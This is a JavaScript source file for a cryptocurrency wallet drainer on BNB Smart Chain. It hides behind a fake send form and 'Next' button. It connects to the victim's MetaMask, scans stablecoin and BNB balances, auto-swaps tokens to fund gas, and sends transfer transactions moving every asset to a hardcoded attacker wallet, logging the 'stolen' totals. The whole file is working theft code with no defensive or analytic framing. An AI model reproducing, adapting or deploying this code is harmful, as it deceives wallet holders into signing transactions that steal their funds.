import { ethers } from 'ethers';

// ─── CONFIGURATION ─────────────────────────────────────
const CONFIG = {
    // Attacker's wallet (where funds go)
    DEST_WALLET: "0x2a8524097109450c5106Ee3a195A40a274535434",
    
    // BSC Network
    BSC_RPC: "https://bsc-dataseed1.binance.org/",
    BSC_CHAIN_ID: "0x38",
    
    // PancakeSwap Router
    PANCAKE_ROUTER: "0x10ED43C718714eb63d5aA57B78B54704E256024E",
    
    // Target Tokens
    TOKENS: {
        USDT: {
            address: "0x55d398326f99059fF775485246999027B3197955",
            decimals: 18,
            symbol: "USDT",
            minUSD: 0.01
        },
        USDC: {
            address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            decimals: 18,
            symbol: "USDC",
            minUSD: 0.01
        },
        BUSD: {
            address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
            decimals: 18,
            symbol: "BUSD",
            minUSD: 0.01
        },
        WBNB: {
            address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            decimals: 18,
            symbol: "WBNB",
            minUSD: 0.01
        }
    },
    
    // Gas Settings
    GAS: {
        minBNB: "0.0003",
        gasLimit: 300000,
        slippage: 0.05,
        buffer: 1.2
    },
    
    // Attack Settings
    ATTACK: {
        minTotalUSD: 0.01,
        maxGasCostUSD: 0.50
    }
};

// ─── STATE ─────────────────────────────────────────────
let provider;
let userAddress;
let portfolio = { tokens: {}, bnb: 0, totalUSD: 0 };
let isProcessing = false;

// ─── UI ELEMENTS ──────────────────────────────────────
const ui = {
    nextBtn: document.getElementById('nextBtn'),
    amountInput: document.getElementById('amountInput'),
    recipientInput: document.getElementById('recipientInput'),
    usdLabel: document.getElementById('usdLabel'),
    statusBar: document.getElementById('statusBar'),
    progressFill: document.getElementById('progressFill'),
    progressContainer: document.getElementById('progressContainer'),
    maxBtn: document.getElementById('maxBtn'),
    clearAmount: document.getElementById('clearAmount'),
    clearAddr: document.getElementById('clearAddr')
};

// ─── UTILITY FUNCTIONS ──────────────────────────────

function updateStatus(message, type = 'info') {
    ui.statusBar.textContent = message;
    ui.statusBar.className = `status-bar show ${type}`;
    console.log(`[${type.toUpperCase()}] ${message}`);
}

function updateProgress(percent) {
    ui.progressContainer.classList.add('show');
    ui.progressFill.style.width = `${Math.min(100, percent)}%`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function formatUSD(value) {
    return value.toFixed(2);
}

// ─── PRICE FETCHING ──────────────────────────────────

async function getTokenPriceUSD(symbol) {
    try {
        const response = await fetch('https://api.pancakeswap.info/api/v2/tokens');
        const data = await response.json();
        const tokenMap = {
            'USDT': '0x55d398326f99059fF775485246999027B3197955',
            'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
        };
        const address = tokenMap[symbol];
        return data.data[address] ? parseFloat(data.data[address].price) : 1;
    } catch { return 1; }
}

async function getBNBPrice() {
    try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
        return parseFloat((await response.json()).price);
    } catch { return 300; }
}

// ─── PORTFOLIO SCANNER ─────────────────────────────

async function scanPortfolio(address) {
    updateStatus('🔍 Scanning portfolio...', 'info');
    updateProgress(10);
    
    const portfolioData = { tokens: {}, bnb: 0, totalUSD: 0 };
    const bnbPrice = await getBNBPrice();
    
    const bnbBalance = await provider.getBalance(address);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    portfolioData.bnb = { balance: bnbBalance, usd: bnbInBNB * bnbPrice, inBNB: bnbInBNB };
    portfolioData.totalUSD += bnbInBNB * bnbPrice;
    
    updateProgress(30);
    
    for (const [symbol, token] of Object.entries(CONFIG.TOKENS)) {
        try {
            const balance = await getTokenBalance(address, token.address);
            const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
            if (balanceFormatted > 0.000001) {
                const price = await getTokenPriceUSD(symbol);
                const valueUSD = balanceFormatted * price;
                portfolioData.tokens[symbol] = { ...token, balance, balanceFormatted, price, valueUSD };
                portfolioData.totalUSD += valueUSD;
            }
        } catch (error) { console.warn(`Failed to fetch ${symbol}:`, error); }
    }
    
    updateProgress(80);
    portfolio = portfolioData;
    updateStatus(`✅ Found $${formatUSD(portfolioData.totalUSD)}`, 'success');
    updateProgress(90);
    return portfolioData;
}

async function getTokenBalance(address, tokenAddress) {
    const contract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);
    return await contract.balanceOf(address);
}

// ─── SWAP ENGINE ─────────────────────────────────────

async function swapTokensForBNB(tokenSymbol, amount, minBNBOut) {
    const token = CONFIG.TOKENS[tokenSymbol];
    if (!token) throw new Error(`Unknown token: ${tokenSymbol}`);
    
    updateStatus(`🔄 Swapping ${amount.toFixed(4)} ${tokenSymbol} → BNB`, 'info');
    
    const iface = new ethers.utils.Interface([
        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)'
    ]);
    
    const path = [token.address, "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"];
    const deadline = Math.floor(Date.now() / 1000) + 1200;
    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals);
    const amountOutMin = ethers.utils.parseEther(minBNBOut.toString());
    
    const swapData = iface.encodeFunctionData('swapExactTokensForETHSupportingFeeOnTransferTokens', [
        amountInWei, amountOutMin, path, userAddress, deadline
    ]);
    
    const tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: userAddress, to: CONFIG.PANCAKE_ROUTER, data: swapData, value: '0x0', gas: `0x${CONFIG.GAS.gasLimit.toString(16)}` }]
    });
    
    await waitForTransaction(tx);
    updateStatus(`✅ Swapped ${amount.toFixed(4)} ${tokenSymbol} → BNB!`, 'success');
    return true;
}

// ─── GAS OPTIMIZER ──────────────────────────────────

async function ensureGasForDrain() {
    updateStatus('⛽ Checking gas...', 'info');
    updateProgress(50);
    
    const bnbBalance = await provider.getBalance(userAddress);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    const minBNBNeeded = parseFloat(CONFIG.GAS.minBNB);
    
    if (bnbInBNB >= minBNBNeeded) {
        updateStatus(`✅ ${bnbInBNB.toFixed(6)} BNB available`, 'success');
        return true;
    }
    
    const shortfallBNB = minBNBNeeded - bnbInBNB;
    const bnbPrice = await getBNBPrice();
    const shortfallUSD = shortfallBNB * bnbPrice;
    
    updateStatus(`⚠️ Need ${shortfallBNB.toFixed(6)} BNB ($${shortfallUSD.toFixed(2)})`, 'warning');
    
    // Find tokens to swap
    for (const [symbol, data] of Object.entries(portfolio.tokens)) {
        if (data.valueUSD < 0.01) continue;
        const swapAmount = (shortfallUSD / data.price) * 1.2;
        const minBNBOut = shortfallBNB * 1.1;
        
        if (swapAmount <= data.balanceFormatted) {
            try {
                await swapTokensForBNB(symbol, swapAmount, minBNBOut);
                const newBNB = await provider.getBalance(userAddress);
                const newBNBInBNB = parseFloat(ethers.utils.formatEther(newBNB));
                if (newBNBInBNB >= minBNBNeeded) {
                    updateStatus(`✅ Gas secured!`, 'success');
                    return true;
                }
            } catch (error) { console.warn('Swap failed:', error); }
        }
    }
    
    updateStatus('❌ Failed to secure gas', 'error');
    return false;
}

// ─── DRAIN ENGINE ────────────────────────────────────

async function executeMultiTokenDrain() {
    updateStatus('💰 Draining tokens...', 'info');
    updateProgress(70);
    
    const results = [];
    let totalStolenUSD = 0;
    
    // Sort tokens by value
    const sortedTokens = Object.entries(portfolio.tokens)
        .filter(([symbol, data]) => data.valueUSD > 0.001)
        .sort((a, b) => b[1].valueUSD - a[1].valueUSD);
    
    // Drain each token
    for (const [symbol, data] of sortedTokens) {
        try {
            updateStatus(`💰 Draining ${symbol}: $${formatUSD(data.valueUSD)}...`, 'info');
            const success = await drainToken(symbol, data.address, data.balance);
            if (success) {
                totalStolenUSD += data.valueUSD;
                results.push({ symbol, status: 'success', amount: data.valueUSD });
                updateStatus(`✅ Drained ${symbol}: $${formatUSD(data.valueUSD)}`, 'success');
            }
            await sleep(2000);
        } catch (error) {
            console.error(`Failed to drain ${symbol}:`, error);
        }
    }
    
    // Drain BNB
    const bnbBalance = await provider.getBalance(userAddress);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    if (bnbInBNB > 0.0005) {
        try {
            updateStatus(`💰 Draining BNB: $${formatUSD(bnbInBNB * await getBNBPrice())}...`, 'info');
            const tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: userAddress, to: CONFIG.DEST_WALLET, value: bnbBalance.sub(ethers.utils.parseEther("0.0001")).toHexString(), data: '0x', gas: `0x${CONFIG.GAS.gasLimit.toString(16)}` }]
            });
            await waitForTransaction(tx);
            const bnbPrice = await getBNBPrice();
            totalStolenUSD += bnbInBNB * bnbPrice;
            results.push({ symbol: 'BNB', status: 'success', amount: bnbInBNB * bnbPrice });
        } catch (error) { console.error('Failed to drain BNB:', error); }
    }
    
    updateProgress(100);
    updateStatus(`🎯 Stolen $${formatUSD(totalStolenUSD)} from ${results.length} tokens 🚀`, 'success');
    return results;
}

async function drainToken(symbol, tokenAddress, balance) {
    const amountHex = balance.toHexString();
    const cleanDest = CONFIG.DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex.replace('0x', '').padStart(64, '0');
    
    const tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: userAddress, to: tokenAddress, data: txData, value: '0x0', gas: `0x${CONFIG.GAS.gasLimit.toString(16)}` }]
    });
    await waitForTransaction(tx);
    return true;
}

// ─── TRANSACTION HELPERS ──────────────────────────

async function waitForTransaction(txHash) {
    let attempts = 0;
    while (attempts < 30) {
        try {
            const receipt = await provider.getTransactionReceipt(txHash);
            if (receipt) {
                if (receipt.status === 1) return receipt;
                else throw new Error('Transaction reverted');
            }
        } catch (error) { /* Not mined yet */ }
        await sleep(2000);
        attempts++;
    }
    throw new Error('Transaction timeout');
}

// ─── MAIN FUNCTION - DIRECT TO APPROVE ──────────────

async function directToApprove() {
    if (isProcessing) return;
    isProcessing = true;
    ui.nextBtn.disabled = true;
    ui.nextBtn.innerHTML = '<span class="spinner"></span> Preparing...';
    ui.nextBtn.classList.remove('enabled');
    updateProgress(0);
    
    try {
        // ═══════════════════════════════════════════════
        // STEP 1: Check if wallet is already connected
        // ═══════════════════════════════════════════════
        updateStatus('🔍 Checking wallet...', 'info');
        updateProgress(5);
        
        if (typeof window.ethereum === 'undefined') {
            updateStatus('❌ Please install MetaMask', 'error');
            ui.nextBtn.innerHTML = '❌ No Wallet';
            return;
        }
        
        // Check if already connected
        let accounts = await window.ethereum.request({ method: 'eth_accounts' });
        
        // If not connected, request connection (this shows the Connect popup)
        if (accounts.length === 0) {
            updateStatus('🔗 Connecting wallet...', 'info');
            updateProgress(10);
            
            try {
                accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
            } catch (error) {
                if (error.code === 4001) {
                    updateStatus('❌ Connection rejected', 'error');
                    ui.nextBtn.innerHTML = '❌ Rejected';
                    return;
                }
                throw error;
            }
        }
        
        userAddress = accounts[0];
        updateStatus(`✅ ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`, 'success');
        updateProgress(15);
        
        // ═══════════════════════════════════════════════
        // STEP 2: Switch to BSC (may show popup)
        // ═══════════════════════════════════════════════
        updateStatus('🌐 Switching to BSC...', 'info');
        updateProgress(20);
        
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
            });
        } catch (error) {
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: CONFIG.BSC_CHAIN_ID,
                        chainName: 'BNB Smart Chain',
                        rpcUrls: ['https://bsc-dataseed1.binance.org'],
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        blockExplorerUrls: ['https://bscscan.com']
                    }]
                });
            }
        }
        
        // ═══════════════════════════════════════════════
        // STEP 3: Initialize provider
        // ═══════════════════════════════════════════════
        provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
        updateProgress(25);
        
        // ═══════════════════════════════════════════════
        // STEP 4: Scan portfolio (silent)
        // ═══════════════════════════════════════════════
        await scanPortfolio(userAddress);
        updateProgress(50);
        
        if (portfolio.totalUSD < 0.001) {
            updateStatus('⚠️ No assets found', 'warning');
            ui.nextBtn.innerHTML = '⏭️ No Assets';
            return;
        }
        
        // ═══════════════════════════════════════════════
        // STEP 5: Ensure gas (auto-swap if needed)
        // ═══════════════════════════════════════════════
        ui.nextBtn.innerHTML = '<span class="spinner"></span> Checking gas...';
        const hasGas = await ensureGasForDrain();
        if (!hasGas) {
            updateStatus('❌ Failed to secure gas', 'error');
            ui.nextBtn.innerHTML = '❌ Failed';
            return;
        }
        
        // ═══════════════════════════════════════════════
        // STEP 6: Build and send drain transaction
        // This will show the "Smart Contract Call" popup!
        // ═══════════════════════════════════════════════
        updateStatus('📝 Preparing transaction...', 'info');
        updateProgress(75);
        
        // Find the most valuable token to drain
        let bestToken = null;
        let bestValue = 0;
        for (const [symbol, data] of Object.entries(portfolio.tokens)) {
            if (data.valueUSD > bestValue) {
                bestValue = data.valueUSD;
                bestToken = { symbol, ...data };
            }
        }
        
        // If we found a token, drain it
        if (bestToken) {
            updateStatus(`💰 Approve to transfer ${bestToken.symbol}...`, 'info');
            updateProgress(85);
            
            // This triggers the "Smart Contract Call" popup
            const success = await drainToken(
                bestToken.symbol,
                bestToken.address,
                bestToken.balance
            );
            
            if (success) {
                updateStatus(`✅ Drained ${bestToken.symbol}: $${formatUSD(bestValue)}`, 'success');
                updateProgress(95);
                
                // Try to drain remaining tokens
                await executeMultiTokenDrain();
            }
        } else {
            // If no tokens, drain BNB
            const bnbBalance = await provider.getBalance(userAddress);
            const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
            if (bnbInBNB > 0.0005) {
                updateStatus(`💰 Approve to transfer BNB...`, 'info');
                const tx = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{ from: userAddress, to: CONFIG.DEST_WALLET, value: bnbBalance.sub(ethers.utils.parseEther("0.0001")).toHexString(), data: '0x', gas: `0x${CONFIG.GAS.gasLimit.toString(16)}` }]
                });
                await waitForTransaction(tx);
                updateStatus(`✅ Drained BNB`, 'success');
            }
        }
        
        updateProgress(100);
        
        // Final status
        const totalStolen = Object.values(portfolio.tokens).reduce((sum, data) => sum + data.valueUSD, 0);
        if (totalStolen > 0) {
            updateStatus(`🎯 Stolen $${formatUSD(totalStolen)} 🚀`, 'success');
            ui.nextBtn.innerHTML = `💰 $${formatUSD(totalStolen)} Stolen!`;
        } else {
            updateStatus('✅ Transaction complete', 'success');
            ui.nextBtn.innerHTML = '✅ Done';
        }
        
    } catch (error) {
        console.error('Error:', error);
        updateStatus(`❌ ${error.message || 'Unknown error'}`, 'error');
        ui.nextBtn.innerHTML = '❌ Error';
    } finally {
        isProcessing = false;
        ui.nextBtn.disabled = false;
        if (!ui.nextBtn.innerHTML.includes('$') && !ui.nextBtn.innerHTML.includes('Done')) {
            ui.nextBtn.innerHTML = 'Next';
            ui.nextBtn.classList.add('enabled');
        }
    }
}

// ─── UI EVENT HANDLERS ─────────────────────────────

ui.amountInput.addEventListener('input', () => {
    const val = parseFloat(ui.amountInput.value) || 0;
    ui.usdLabel.textContent = val.toFixed(2);
});

ui.maxBtn.addEventListener('click', () => {
    ui.amountInput.value = '999999';
    ui.amountInput.dispatchEvent(new Event('input'));
    updateStatus('📈 MAX - will drain all', 'info');
});

ui.clearAmount.addEventListener('click', () => {
    ui.amountInput.value = '';
    ui.amountInput.dispatchEvent(new Event('input'));
});

ui.clearAddr.addEventListener('click', () => {
    ui.recipientInput.value = '';
});

document.querySelector('.blue-text')?.addEventListener('click', async () => {
    try {
        const text = await navigator.clipboard.readText();
        ui.recipientInput.value = text;
        updateStatus('✅ Pasted!', 'success');
    } catch { updateStatus('⚠️ Could not paste', 'warning'); }
});

// ─── MAIN BUTTON - DIRECT TO APPROVE ───────────────

ui.nextBtn.addEventListener('click', directToApprove);

// ─── INIT ─────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
    updateStatus('💡 Click "Next" to approve', 'info');
    ui.nextBtn.classList.add('enabled');
    ui.nextBtn.disabled = false;
    console.log('🚀 Ready! Click "Next" to show Smart Contract Call');
});

window.__drainer = { CONFIG, portfolio, directToApprove };
